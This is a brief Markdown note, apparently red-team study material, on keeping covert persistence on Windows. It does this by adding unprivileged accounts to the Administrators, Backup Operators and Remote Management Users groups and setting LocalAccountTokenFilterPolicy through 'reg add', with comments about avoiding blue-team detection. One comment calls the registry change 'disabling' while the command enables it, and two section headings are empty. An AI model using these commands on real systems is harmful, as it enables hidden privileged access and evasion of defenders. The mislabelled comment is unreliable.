# make Unprivileged users to have cirtical access
Having an administrator's credential would be the easiest way to achieve persistence in a machine. However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.


## Assign Group Memberships
- **Administrator Group**:
```ps1
# make it part of the Administrators group But this looks too suspicious
net localgroup administrators <Unpriv-username> /add
```
- **BackupOperators Group**:
```ps1
#  make it part of the BackupOperators group. Users in this group will be allowed to read/write any file or registry key, ignoring DACL
net localgroup "Backup Operators" <Unpriv-username> /add
# it still cannot RDP or WinRM back to the machine, we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups
net localgroup "Remote Management Users" <Unpriv-username> /add
# we are a part of Backup Operators, but the group is disabled, we'll have to disable LocalAccountTokenFilterPolicy: 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

## Special Privileges and Security Descriptors

## RID Hijacking
